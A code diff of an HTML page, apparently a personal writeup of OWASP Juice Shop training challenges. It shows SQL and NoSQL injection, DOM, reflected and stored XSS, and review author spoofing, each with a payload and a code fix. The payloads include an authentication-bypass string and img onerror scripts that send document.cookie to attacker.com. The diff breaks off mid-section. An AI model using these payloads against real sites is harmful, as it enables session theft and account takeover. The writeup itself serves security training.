@@ -15,65 +15,35 @@
         .nav-link:hover { color: #60a5fa; transition: 0.3s; }
         .mono { font-family: 'JetBrains Mono', monospace; }
 
-        /* Tag styles */
         .tag { display: inline-flex; align-items: center; gap: 4px; padding: 3px 10px; border-radius: 9999px; font-size: 0.7rem; font-weight: 600; font-family: 'JetBrains Mono', monospace; letter-spacing: 0.03em; cursor: pointer; transition: all 0.2s; border: 1px solid transparent; }
         .tag-xss { background: rgba(239,68,68,0.12); color: #f87171; border-color: rgba(239,68,68,0.25); }
-        .tag-xss:hover, .tag-xss.active { background: rgba(239,68,68,0.25); border-color: #f87171; }
         .tag-injection { background: rgba(251,146,60,0.12); color: #fb923c; border-color: rgba(251,146,60,0.25); }
-        .tag-injection:hover, .tag-injection.active { background: rgba(251,146,60,0.25); border-color: #fb923c; }
         .tag-access { background: rgba(168,85,247,0.12); color: #c084fc; border-color: rgba(168,85,247,0.25); }
-        .tag-access:hover, .tag-access.active { background: rgba(168,85,247,0.25); border-color: #c084fc; }
         .tag-sqli { background: rgba(34,197,94,0.12); color: #4ade80; border-color: rgba(34,197,94,0.25); }
-        .tag-sqli:hover, .tag-sqli.active { background: rgba(34,197,94,0.25); border-color: #4ade80; }
         .tag-all { background: rgba(59,130,246,0.12); color: #60a5fa; border-color: rgba(59,130,246,0.25); }
-        .tag-all:hover, .tag-all.active { background: rgba(59,130,246,0.25); border-color: #60a5fa; }
+        .tag.active { background: rgba(59,130,246,0.25); border-color: #60a5fa; }
 
-        /* Challenge card */
         .challenge-card { transition: all 0.3s ease; }
         .challenge-card.hidden { display: none; }
         .challenge-card:hover { transform: translateY(-2px); }
 
-        /* Severity badges */
-        .sev-critical { background: rgba(239,68,68,0.15); color: #ef4444; border: 1px solid rgba(239,68,68,0.3); }
-        .sev-high { background: rgba(251,146,60,0.15); color: #f97316; border: 1px solid rgba(251,146,60,0.3); }
-        .sev-medium { background: rgba(234,179,8,0.15); color: #eab308; border: 1px solid rgba(234,179,8,0.3); }
-
-        /* Code blocks */
         pre { background: #0d1117; border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 1rem 1.25rem; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; line-height: 1.6; color: #e2e8f0; }
         code { font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; background: rgba(255,255,255,0.07); padding: 2px 6px; border-radius: 4px; color: #7dd3fc; }
-        pre code { background: none; padding: 0; color: #e2e8f0; }
-
-        /* Section markers */
+        
         .exploit-label { font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; font-weight: 600; letter-spacing: 0.1em; text-transform: uppercase; padding: 2px 8px; border-radius: 4px; }
         .exploit-bg { background: rgba(239,68,68,0.15); color: #f87171; }
         .fix-bg { background: rgba(34,197,94,0.15); color: #4ade80; }
 
-        /* Timeline dot */
         .dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; margin-top: 5px; }
-
-        /* Accordion */
         .accordion-content { max-height: 0; overflow: hidden; transition: max-height 0.4s ease; }
-        .accordion-content.open { max-height: 2000px; }
+        .accordion-content.open { max-height: 3500px; }
         .chevron { transition: transform 0.3s ease; }
         .chevron.open { transform: rotate(180deg); }
-
-        /* Hero scanline effect */
         .scanlines { background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px); pointer-events: none; }
-
-        /* Progress bar */
-        .progress-bar { height: 3px; background: linear-gradient(90deg, #3b82f6, #2dd4bf); border-radius: 9999px; }
-
-        /* Sticky TOC */
-        .toc-item { padding: 4px 12px; border-left: 2px solid transparent; transition: all 0.2s; font-size: 0.8rem; color: #64748b; cursor: pointer; }
-        .toc-item:hover, .toc-item.active { border-color: #3b82f6; color: #93c5fd; background: rgba(59,130,246,0.05); }
-
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
-        .fade-in { animation: fadeIn 0.5s ease forwards; }
     </style>
 </head>
 <body>
 
-    <!-- Nav (same as portfolio) -->
     <nav class="fixed top-0 w-full z-50 glass-card py-4">
         <div class="max-w-6xl mx-auto px-6 flex justify-between items-center">
             <a href="index.html" class="text-xl font-bold gradient-text">HS.</a>
@@ -86,56 +56,30 @@
                     <i class="fas fa-file-download mr-2"></i>Resume
                 </a>
             </div>
-            <!-- Mobile back -->
-            <a href="index.html" class="md:hidden text-slate-400 hover:text-white text-sm flex items-center gap-2">
-                <i class="fas fa-arrow-left"></i> Back
-            </a>
         </div>
     </nav>
 
-    <!-- Hero -->
     <header class="pt-36 pb-16 px-6 relative overflow-hidden">
         <div class="absolute inset-0 scanlines"></div>
-        <div class="absolute top-20 right-0 w-96 h-96 bg-blue-600/5 rounded-full blur-3xl"></div>
-        <div class="absolute bottom-0 left-10 w-64 h-64 bg-teal-500/5 rounded-full blur-3xl"></div>
-
         <div class="max-w-4xl mx-auto relative">
-            <div class="flex items-center gap-3 mb-6">
-                <a href="index.html#blog" class="text-slate-500 hover:text-blue-400 transition text-sm flex items-center gap-1">
-                    <i class="fas fa-arrow-left text-xs"></i> Writing
-                </a>
-                <span class="text-slate-700">/</span>
-                <span class="text-slate-500 text-sm mono">security-research</span>
-            </div>
-
-            <div class="flex flex-wrap gap-2 mb-6">
-                <span class="tag tag-xss">XSS</span>
-                <span class="tag tag-injection">Injection</span>
-                <span class="tag tag-sqli">SQLi</span>
-                <span class="tag tag-access">Access Control</span>
-            </div>
-
             <h1 class="text-4xl md:text-6xl font-black text-white mb-4 leading-tight" style="font-family: 'Syne', sans-serif;">
-                OWASP Juice Shop<br><span class="gradient-text">Vulnerability Writeup</span>
+                OWASP Juice Shop<br><span class="gradient-text">Security Research Writeup</span>
             </h1>
             <p class="text-slate-400 text-lg max-w-2xl leading-relaxed mb-8">
-                A hands-on walkthrough of exploiting and patching real web vulnerabilities — XSS variants, SQL injection, NoSQL injection, and broken access control — using OWASP Juice Shop.
+                Documentation of 8 distinct vulnerabilities, exploring the mechanics of exploitation and code-level remediation.
             </p>
-
-            <div class="flex flex-wrap items-center gap-6 text-sm text-slate-500">
-                <span class="flex items-center gap-2"><i class="fas fa-user text-blue-400"></i> Harshith Suresh</span>
-                <span class="flex items-center gap-2"><i class="fas fa-calendar text-blue-400"></i> March 2026</span>
-                <span class="flex items-center gap-2"><i class="fas fa-clock text-blue-400"></i> ~15 min read</span>
-                <span class="flex items-center gap-2"><i class="fas fa-bug text-red-400"></i> 8 vulnerabilities</span>
+            <div class="flex flex-wrap items-center gap-6 text-sm text-slate-500 mono">
+                <span class="flex items-center gap-2">Harshith Suresh</span>
+                <span class="flex items-center gap-2">March 2026</span>
+                <span class="flex items-center gap-2">8 Vulnerabilities</span>
             </div>
         </div>
     </header>
 
-    <!-- Filter bar -->
     <div class="sticky top-16 z-40 bg-[#0a0f1e]/90 backdrop-blur border-b border-slate-800/60 py-3 px-6">
         <div class="max-w-4xl mx-auto flex items-center gap-3 flex-wrap">
             <span class="text-xs text-slate-500 mono mr-1">FILTER:</span>
-            <button class="tag tag-all active" onclick="filterCards('all', this)">All <span id="count-all" class="ml-1 opacity-60">8</span></button>
+            <button class="tag tag-all active" onclick="filterCards('all', this)">All 8</button>
             <button class="tag tag-xss" onclick="filterCards('xss', this)">XSS</button>
             <button class="tag tag-injection" onclick="filterCards('injection', this)">Injection</button>
             <button class="tag tag-sqli" onclick="filterCards('sqli', this)">SQLi</button>
@@ -143,89 +87,56 @@
         </div>
     </div>
 
-    <!-- Main content -->
     <main class="max-w-4xl mx-auto px-6 py-12 space-y-6">
 
-        <!-- Intro -->
-        <div class="glass-card rounded-2xl p-8 mb-4">
-            <h2 class="text-xl font-bold text-white mb-3 flex items-center gap-2">
-                <i class="fas fa-info-circle text-blue-400"></i> About This Writeup
-            </h2>
-            <p class="text-slate-400 leading-relaxed">
-                OWASP Juice Shop is an intentionally vulnerable web application used for security training. This writeup documents vulnerabilities I discovered and exploited, how each attack works mechanically, and the fixes required to remediate them. Each challenge includes the actual exploit payload used and a concrete code-level fix.
-            </p>
-        </div>
-
-        <!-- ===== 1. SQL Injection ===== -->
         <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="sqli injection">
             <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
                 <div class="flex items-start gap-4">
                     <div class="dot bg-green-400 mt-1"></div>
                     <div>
                         <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="sev-critical text-xs font-bold px-2 py-0.5 rounded mono">CRITICAL</span>
                             <span class="tag tag-sqli">SQLi</span>
                             <span class="tag tag-injection">Injection</span>
                         </div>
                         <h2 class="text-xl font-bold text-white">Admin Login via SQL Injection</h2>
-                        <p class="text-slate-500 text-sm mt-1">Bypass authentication entirely using a crafted email payload</p>
+                        <p class="text-slate-500 text-sm mt-1">Authentication bypass via crafted email payload</p>
                     </div>
                 </div>
                 <i class="fas fa-chevron-down chevron text-slate-500 mt-1 flex-shrink-0"></i>
             </div>
             <div class="accordion-content">
                 <div class="px-6 pb-6 space-y-5">
-                    <div>
-                        <p class="text-slate-400 leading-relaxed">The login endpoint passes the user-supplied email directly into a SQL query without sanitization. By injecting SQL syntax into the email field, the password check can be completely bypassed.</p>
-                    </div>
-
-                    <div>
-                        <div class="exploit-label exploit-bg mb-2">Exploit</div>
-                        <pre>POST /rest/user/login
-{
-  "email": "admin' OR TRUE --",
-  "password": "anything"
-}</pre>
-                        <p class="text-slate-500 text-sm mt-2">The <code>'</code> closes the email string, <code>OR TRUE</code> makes the WHERE clause always true, and <code>--</code> comments out the password check entirely.</p>
-                    </div>
+                    <p class="text-slate-400 leading-relaxed">The login endpoint passes the user-supplied email directly into a SQL query without sanitization. By injecting SQL syntax, the password check can be completely bypassed as the single quote closes the email string and <code>--</code> terminates the remainder of the query.</p>
+                    
+                    <div class="exploit-label exploit-bg mb-2">Payload</div>
+                    <pre>{"email":"admin' OR TRUE --","password":"admin"}</pre>
 
                     <div class="bg-red-500/5 border border-red-500/20 rounded-xl p-4">
-                        <p class="text-xs mono text-red-400 mb-2 font-bold">ERROR LEAK (server exposed the raw SQL)</p>
-                        <pre style="font-size:0.72rem;">SELECT * FROM Users WHERE email = 'admin OR '1=1 --'
-AND password = '21232f...' AND deletedAt IS NULL</pre>
-                        <p class="text-slate-500 text-xs mt-2">The server returned the full SQL query in its error response — a secondary vulnerability that made solving this trivial.</p>
+                        <p class="text-xs mono text-red-400 mb-2 font-bold">SQL LEAKAGE</p>
+                        <pre style="font-size:0.72rem;">"sql": "SELECT * FROM Users WHERE email = 'admin OR '1=1 --' AND password = '...'</pre>
+                        <p class="text-slate-500 text-xs mt-2">The server exposed the full SQL query in the error response, facilitating the attack.</p>
                     </div>
 
-                    <div>
-                        <div class="exploit-label fix-bg mb-2">Fix</div>
-                        <pre><span style="color:#6b7280">// ❌ Vulnerable — string interpolation</span>
-db.query(`SELECT * FROM Users WHERE email = '${email}'`)
-
-<span style="color:#6b7280">// ✅ Safe — parameterized query</span>
+                    <div class="exploit-label fix-bg mb-2">Solution</div>
+                    <pre>// Safe — parameterized query
 db.query('SELECT * FROM Users WHERE email = ?', [email])
 
-<span style="color:#6b7280">// ✅ Also — never expose SQL errors to the client</span>
-res.status(500).json({ error: 'Authentication failed' })
-<span style="color:#6b7280">// not: res.status(500).json({ error: err.message, sql: err.sql })</span></pre>
-                    </div>
-
+// Also — never expose SQL errors to the client
+res.status(500).json({ error: 'Authentication failed' })</pre>
                     <div class="bg-slate-800/40 rounded-xl p-4 text-sm text-slate-400">
-                        <strong class="text-white">Key Lesson:</strong> Parameterized queries treat user input as pure data, never as SQL syntax. The <code>'--</code> becomes a literal string to match, not a query terminator. Error messages must never expose internal query structure.
+                        <strong class="text-white">Key Lesson:</strong> Parameterized queries treat user input as pure data, never as syntax. The <code>'--</code> becomes a literal string to match, not a terminator.
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- ===== 2. DOM XSS ===== -->
         <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="xss">
             <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
                 <div class="flex items-start gap-4">
                     <div class="dot bg-red-400 mt-1"></div>
                     <div>
                         <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="sev-high text-xs font-bold px-2 py-0.5 rounded mono">HIGH</span>
                             <span class="tag tag-xss">XSS</span>
-                            <span class="tag tag-xss" style="background:rgba(239,68,68,0.08);color:#fca5a5">DOM-Based</span>
                         </div>
                         <h2 class="text-xl font-bold text-white">DOM-Based XSS via Search Parameter</h2>
                         <p class="text-slate-500 text-sm mt-1">Inject HTML via location.hash — never touches the server</p>
@@ -235,129 +146,85 @@ res.status(500).json({ error: 'Authentication failed' })
             </div>
             <div class="accordion-content">
                 <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">Angular reads <code>location.hash</code> to handle routing in this SPA. The search component takes the <code>q</code> parameter and renders it directly into the DOM using <code>innerHTML</code> — without any sanitization. Since everything after <code>#</code> stays in the browser and never reaches the server, this is a pure DOM-based attack.</p>
-
-                    <div>
-                        <div class="exploit-label exploit-bg mb-2">Exploit — Cookie Exfiltration</div>
-                        <pre>http://localhost:3000/#/search?q=&lt;img src=x onerror="new Image().src='https://attacker.com/steal?c='%2Bdocument.cookie"&gt;</pre>
-                        <p class="text-slate-500 text-sm mt-2">The <code>img</code> tag's <code>src=x</code> intentionally fails, triggering <code>onerror</code> which silently sends <code>document.cookie</code> (including the JWT) to the attacker's endpoint. Victim just has to click the link.</p>
-                    </div>
-
+                    <p class="text-slate-400 leading-relaxed">Angular uses <code>location.hash</code> for routing. The search component renders the <code>q</code> parameter directly into the DOM using <code>innerHTML</code>. Since everything after <code>#</code> stays in the browser, this attack remains invisible to server-side WAFs.</p>
+                    
+                    <div class="exploit-label exploit-bg mb-2">Payload — Cookie Exfiltration</div>
+                    <pre>http://localhost:3000/#/search?q=&lt;img src=x onerror="new Image().src='https://attacker.com/steal?c='%2Bdocument.cookie"&gt;</pre>
+                    
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
                         <div class="bg-slate-800/40 rounded-xl p-4">
                             <p class="text-xs mono text-slate-500 mb-2">WHY img onerror?</p>
-                            <p class="text-slate-400 text-sm">Not blocked by CORS. Works in all browsers. Only one encoding layer to survive. More reliable than <code>javascript:</code> URIs in iframe src.</p>
+                            <p class="text-slate-400 text-sm">Not blocked by CORS. Bypasses certain URI filters that block <code>javascript:</code>.</p>
                         </div>
                         <div class="bg-slate-800/40 rounded-xl p-4">
-                            <p class="text-xs mono text-slate-500 mb-2">WHY # hash?</p>
-                            <p class="text-slate-400 text-sm">The browser never sends the <code>#fragment</code> to the server. Only JS can read it via <code>location.hash</code>. Invisible to server-side WAFs and logs.</p>
+                            <p class="text-xs mono text-slate-500 mb-2">WHY hash (#)?</p>
+                            <p class="text-slate-400 text-sm">Browser does not send fragments to the server. Purely client-side execution.</p>
                         </div>
                     </div>
 
-                    <div>
-                        <div class="exploit-label fix-bg mb-2">Fix</div>
-                        <pre><span style="color:#6b7280">// ❌ Vulnerable sink</span>
-element.innerHTML = location.hash.slice(1)
-
-<span style="color:#6b7280">// ✅ Use textContent — treats input as plain text</span>
+                    <div class="exploit-label fix-bg mb-2">Solution</div>
+                    <pre>// Use textContent — treats input as plain text
 element.textContent = location.hash.slice(1)
 
-<span style="color:#6b7280">// ✅ If HTML rendering is required, sanitize first</span>
-element.innerHTML = DOMPurify.sanitize(userInput)
-
-<span style="color:#6b7280">// ✅ Angular: use {{ }} not [innerHTML]</span>
-&lt;p&gt;{{ searchQuery }}&lt;/p&gt;  <span style="color:#6b7280">// auto-escaped</span></pre>
-                    </div>
-
-                    <div>
-                        <p class="text-xs mono text-slate-500 mb-2 font-bold">ADDITIONAL DEFENSES</p>
-                        <div class="space-y-2 text-sm text-slate-400">
-                            <div class="flex items-start gap-2"><span class="text-green-400 mt-0.5">✓</span> <span><strong class="text-white">HttpOnly cookies</strong> — makes <code>document.cookie</code> return empty even if XSS fires</span></div>
-                            <div class="flex items-start gap-2"><span class="text-green-400 mt-0.5">✓</span> <span><strong class="text-white">CSP</strong> — <code>connect-src 'self'</code> blocks exfiltration to external endpoints</span></div>
-                            <div class="flex items-start gap-2"><span class="text-green-400 mt-0.5">✓</span> <span><strong class="text-white">Short JWT expiry</strong> — limits damage window if token is stolen</span></div>
-                        </div>
-                    </div>
+// Angular: use {{ }} not [innerHTML]
+&lt;p&gt;{{ searchQuery }}&lt;/p&gt;</pre>
                 </div>
             </div>
         </div>
 
-        <!-- ===== 3. Reflected XSS ===== -->
         <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="xss">
             <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
                 <div class="flex items-start gap-4">
                     <div class="dot bg-orange-400 mt-1"></div>
                     <div>
                         <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="sev-high text-xs font-bold px-2 py-0.5 rounded mono">HIGH</span>
                             <span class="tag tag-xss">XSS</span>
-                            <span class="tag tag-xss" style="background:rgba(251,146,60,0.08);color:#fdba74">Reflected</span>
                         </div>
-                        <h2 class="text-xl font-bold text-white">Reflected XSS via Order Tracking ID</h2>
-                        <p class="text-slate-500 text-sm mt-1">Server echoes the payload back in its HTML response</p>
+                        <h2 class="text-xl font-bold text-white">Reflected XSS via Order Tracking</h2>
+                        <p class="text-slate-500 text-sm mt-1">Server echoes payload in the HTML response</p>
                     </div>
                 </div>
                 <i class="fas fa-chevron-down chevron text-slate-500 mt-1 flex-shrink-0"></i>
             </div>
             <div class="accordion-content">
                 <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">The order tracking endpoint takes an <code>id</code> query parameter, passes it to the server, and the server reflects it back unsanitized in the HTML response. Unlike DOM XSS, this payload makes a real HTTP round trip — the server processes it and injects it into the page markup it returns.</p>
-
-                    <div>
-                        <div class="exploit-label exploit-bg mb-2">Exploit</div>
-                        <pre>http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E
-
-<span style="color:#6b7280"># Decoded: ?id=&lt;iframe src="javascript:alert(`xss`)"&gt;</span></pre>
-                        <p class="text-slate-500 text-sm mt-2">Note: requires a page reload because Angular (SPA) doesn't immediately fire an HTTP request. The reload forces a real server call that returns the reflected payload.</p>
-                    </div>
+                    <p class="text-slate-400 leading-relaxed">This payload makes a full HTTP round trip. The server processes the <code>id</code> parameter and injects it back into the page markup. In this SPA, a reload is required to force the server call.</p>
+                    
+                    <div class="exploit-label exploit-bg mb-2">Payload</div>
+                    <pre>http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E</pre>
 
                     <div class="bg-slate-800/40 rounded-xl p-4">
-                        <p class="text-xs mono text-blue-400 mb-3 font-bold">DOM XSS vs REFLECTED XSS</p>
+                        <p class="text-xs mono text-blue-400 mb-3 font-bold">XSS Comparison</p>
                         <div class="overflow-x-auto">
                             <table class="w-full text-xs text-slate-400 mono">
                                 <thead><tr class="text-slate-500 border-b border-slate-700"><th class="text-left py-1 pr-4">Property</th><th class="text-left py-1 pr-4">DOM XSS</th><th class="text-left py-1">Reflected XSS</th></tr></thead>
-                                <tbody class="space-y-1">
-                                    <tr class="border-b border-slate-800"><td class="py-1.5 pr-4">Hits server?</td><td class="pr-4 text-red-400">Never</td><td class="text-orange-400">Yes</td></tr>
-                                    <tr class="border-b border-slate-800"><td class="py-1.5 pr-4">In server logs?</td><td class="pr-4 text-red-400">No</td><td class="text-orange-400">Yes</td></tr>
-                                    <tr class="border-b border-slate-800"><td class="py-1.5 pr-4">URL indicator</td><td class="pr-4 text-blue-400"># hash</td><td class="text-blue-400">? param</td></tr>
-                                    <tr><td class="py-1.5 pr-4">WAF catchable?</td><td class="pr-4 text-red-400">Very hard</td><td class="text-green-400">Much easier</td></tr>
+                                <tbody>
+                                    <tr class="border-b border-slate-800"><td class="py-1.5 pr-4">Hits server?</td><td class="pr-4 text-red-400">No</td><td class="text-orange-400">Yes</td></tr>
+                                    <tr class="border-b border-slate-800"><td class="py-1.5 pr-4">Indicator</td><td class="pr-4 text-blue-400"># hash</td><td class="text-blue-400">? param</td></tr>
                                 </tbody>
                             </table>
                         </div>
                     </div>
 
-                    <div>
-                        <div class="exploit-label fix-bg mb-2">Fix</div>
-                        <pre><span style="color:#6b7280">// ❌ Vulnerable — raw param in response</span>
-res.send(`&lt;p&gt;Tracking: ${req.query.id}&lt;/p&gt;`)
-
-<span style="color:#6b7280">// ✅ Validate — id should only be alphanumeric</span>
-if (!/^[a-zA-Z0-9-]+$/.test(req.query.id)) {
-  return res.status(400).send('Invalid order ID')
-}
-
-<span style="color:#6b7280">// ✅ Output encode before inserting into HTML</span>
+                    <div class="exploit-label fix-bg mb-2">Solution</div>
+                    <pre>// Output encode before inserting into HTML
 const safe = req.query.id
   .replace(/&amp;/g, '&amp;amp;')
   .replace(/&lt;/g, '&amp;lt;')
-  .replace(/&gt;/g, '&amp;gt;')
-res.send(`&lt;p&gt;Tracking: ${safe}&lt;/p&gt;`)</pre>
-                    </div>
+  .replace(/&gt;/g, '&amp;gt;')</pre>
                 </div>
             </div>
         </div>
 
-        <!-- ===== 4. Stored/API XSS ===== -->
         <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="xss">
             <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
                 <div class="flex items-start gap-4">
-                    <div class="dot bg-red-500 mt-1"></div>
+                    <div class="dot bg-red-400 mt-1"></div>
                     <div>
                         <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="sev-critical text-xs font-bold px-2 py-0.5 rounded mono">CRITICAL</span>
                             <span class="tag tag-xss">XSS</span>
-                            <span class="tag tag-xss" style="background:rgba(239,68,68,0.15);color:#ef4444">Stored</span>
                         </div>
-                        <h2 class="text-xl font-bold text-white">Stored XSS via Product Description API</h2>
+                        <h2 class="text-xl font-bold text-white">Stored XSS via Product API</h2>
                         <p class="text-slate-500 text-sm mt-1">Payload persists in database — every visitor is a victim</p>
                     </div>
                 </div>
@@ -365,325 +232,152 @@ res.send(`&lt;p&gt;Tracking: ${safe}&lt;/p&gt;`)</pre>
             </div>
             <div class="accordion-content">
                 <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">By intercepting a product update request in Burp Suite, I modified the <code>description</code> field of a product to include a malicious <code>&lt;img onerror&gt;</code> payload. The API saved this raw HTML to the database. Angular then renders the description using <code>[innerHTML]</code>, executing the payload for every user who views the product — no phishing link required.</p>
-
-                    <div>
-                        <div class="exploit-label exploit-bg mb-2">Exploit — Burp Suite Intercept</div>
-                        <pre>PUT /api/Products/1
-{
-  "description": "&lt;img src=x onerror='new Image().src=\"https://attacker.com/steal?c=\"+document.cookie'&gt;"
-}</pre>
-                    </div>
-
-                    <div class="bg-red-500/5 border border-red-500/20 rounded-xl p-4">
-                        <p class="text-sm text-slate-400"><span class="text-red-400 font-bold">Why this is CRITICAL:</span> This is a passive attack. After the one-time injection, the attacker does nothing. Every user who clicks "Apple Pomace" silently exfiltrates their JWT to the attacker's server. Including admins. No crafted link, no phishing, no interaction needed from the attacker.</p>
-                    </div>
-
-                    <div>
-                        <div class="exploit-label fix-bg mb-2">Fix</div>
-                        <pre><span style="color:#6b7280">// ✅ Sanitize on ingest — strip HTML at the API layer</span>
-const DOMPurify = require('isomorphic-dompurify')
+                    <p class="text-slate-400 leading-relaxed">By intercepting product updates, malicious payloads are stored in the database. This is a passive attack; once injected, the script executes for any user who views the product, including administrators.</p>
+                    
+                    <div class="exploit-label exploit-bg mb-2">Payload — API Intercept</div>
+                    <pre>"description": "&lt;img src=x onerror='new Image().src=\"https://attacker.com/steal?c=\"+document.cookie'&gt;"</pre>
+                    
+                    <div class="exploit-label fix-bg mb-2">Solution</div>
+                    <pre>// Sanitize on ingest strip HTML at the API layer
 const clean = DOMPurify.sanitize(req.body.description)
-db.product.update({ description: clean })
-
-<span style="color:#6b7280">// ✅ Angular template — use interpolation, not innerHTML</span>
-&lt;p&gt;{{ product.description }}&lt;/p&gt;   <span style="color:#6b7280">// safe</span>
-&lt;p [innerHTML]="product.description"&gt;&lt;/p&gt;  <span style="color:#6b7280">// dangerous</span>
-
-<span style="color:#6b7280">// ✅ If innerHTML is needed, sanitize client-side too</span>
-import DOMPurify from 'dompurify'
-element.innerHTML = DOMPurify.sanitize(product.description)</pre>
-                    </div>
-
-                    <div class="bg-slate-800/40 rounded-xl p-4 text-sm text-slate-400">
-                        <strong class="text-white">Rule:</strong> The database storing HTML is not inherently the vulnerability — it's the frontend trusting that stored HTML enough to render it without sanitization. Sanitize on both ingress (API) and egress (render). Never rely on only one.
-                    </div>
+db.product.update({ description: clean })</pre>
                 </div>
             </div>
         </div>
 
-        <!-- ===== 5. NoSQL Injection ===== -->
         <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="injection">
             <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
                 <div class="flex items-start gap-4">
                     <div class="dot bg-orange-400 mt-1"></div>
                     <div>
                         <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="sev-high text-xs font-bold px-2 py-0.5 rounded mono">HIGH</span>
                             <span class="tag tag-injection">Injection</span>
-                            <span class="tag tag-injection" style="background:rgba(251,146,60,0.08);color:#fdba74">NoSQL</span>
                         </div>
-                        <h2 class="text-xl font-bold text-white">NoSQL Injection on Review Endpoint</h2>
-                        <p class="text-slate-500 text-sm mt-1">MongoDB operator injection to modify other users' reviews</p>
+                        <h2 class="text-xl font-bold text-white">NoSQL Operator Injection</h2>
+                        <p class="text-slate-500 text-sm mt-1">MongoDB operator injection to modify global reviews</p>
                     </div>
                 </div>
                 <i class="fas fa-chevron-down chevron text-slate-500 mt-1 flex-shrink-0"></i>
             </div>
             <div class="accordion-content">
                 <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">The review update endpoint at <code>/rest/products/reviews</code> passes the <code>id</code> field directly into a MongoDB query. By supplying a JSON object with a <code>$in</code> operator instead of a plain string, I was able to update multiple users' reviews simultaneously using admin credentials.</p>
+                    <p class="text-slate-400 leading-relaxed">The review update endpoint passes the <code>id</code> directly into a MongoDB query. By providing a JSON object with a <code>$in</code> operator, I could modify multiple reviews simultaneously.</p>
+                    
+                    <div class="exploit-label exploit-bg mb-2">Payload</div>
+                    <pre>{ "id": { "$in": ["ID_1", "ID_2"] }, "message": "hacked" }</pre>
 
-                    <div>
-                        <div class="exploit-label exploit-bg mb-2">Exploit</div>
-                        <pre>PATCH /rest/products/reviews
-{
-  "message": "hacked review",
-  "id": {
-    "$in": [
-      "5HhCCHJeLokngSmEj",
-      "3PSWpjP49bPMZfyuy"
-    ]
-  }
+                    <div class="exploit-label fix-bg mb-2">Solution</div>
+                    <pre>if (typeof req.body.id !== 'string') {
+  return res.status(400).json({ error: 'Invalid id' })
 }</pre>
-                        <p class="text-slate-500 text-sm mt-2">Instead of matching a single review by ID, <code>$in</code> matches any document whose <code>_id</code> is in the array — overwriting multiple reviews in one request.</p>
-                    </div>
-
-                    <div>
-                        <div class="exploit-label fix-bg mb-2">Fix</div>
-                        <pre><span style="color:#6b7280">// ❌ Vulnerable — object passed directly to DB</span>
-db.reviews.update({ _id: req.body.id }, { message: req.body.message })
-
-<span style="color:#6b7280">// ✅ Validate type before querying</span>
-if (typeof req.body.id !== 'string') {
-  return res.status(400).json({ error: 'Invalid id format' })
-}
-
-<span style="color:#6b7280">// ✅ Or enforce schema with Joi</span>
-const schema = Joi.object({
-  id: Joi.string().required(),
-  message: Joi.string().max(500).required()
-})
-const { error } = schema.validate(req.body)
-if (error) return res.status(400).json({ error: error.message })</pre>
-                    </div>
                 </div>
             </div>
         </div>
 
-        <!-- ===== 6. Review Author Spoofing ===== -->
         <div class="challenge-card glass-card rounded-2xl overflow-hidden" data-tags="access">
             <div class="p-6 cursor-pointer flex items-start justify-between gap-4" onclick="toggleAccordion(this)">
                 <div class="flex items-start gap-4">
                     <div class="dot bg-purple-400 mt-1"></div>
                     <div>
                         <div class="flex flex-wrap items-center gap-2 mb-2">
-                            <span class="sev-medium text-xs font-bold px-2 py-0.5 rounded mono">MEDIUM</span>
                             <span class="tag tag-access">Access Control</span>
                         </div>
-                        <h2 class="text-xl font-bold text-white">Post Review as Any User</h2>
-                        <p class="text-slate-500 text-sm mt-1">API trusts client-supplied author identity</p>
+                        <h2 class="text-xl font-bold text-white">Review Author Spoofing</h2>
+                        <p class="text-slate-500 text-sm mt-1">API trusts client-supplied identity claims</p>
                     </div>
                 </div>
                 <i class="fas fa-chevron-down chevron text-slate-500 mt-1 flex-shrink-0"></i>
             </div>
             <div class="accordion-content">
                 <div class="px-6 pb-6 space-y-5">
-                    <p class="text-slate-400 leading-relaxed">The review creation endpoint accepts an <code>author</code> field in the request body and uses it directly, without cross-checking it against the authenticated session. Any logged-in user can impersonate any other user by simply changing the <code>author</code> value.</p>
+                    <p class="text-slate-400 leading-relaxed">The server trusts the "author" field in the JSON body. An attacker can impersonate any user by simply providing their email address in the request payload.</p>
+                    
+                    <div class="exploit-label exploit-bg mb-2">Payload</div>
+                    <pre>{"message":"spoofed","author":"victim@juice-sh.op"}</pre>
 
-                    <div>
-                        <div class="exploit-label exploit-bg mb-2">Exploit</div>
-                        <pre>PUT /rest/products/1/reviews HTTP/1.1
-Authorization: Bearer &lt;your_jwt&gt;
-
-{
-  "message": "Terrible product!",
-  "author": "victim@juice-sh.op"
-}</pre>
-                    </div>
-
-                    <div>
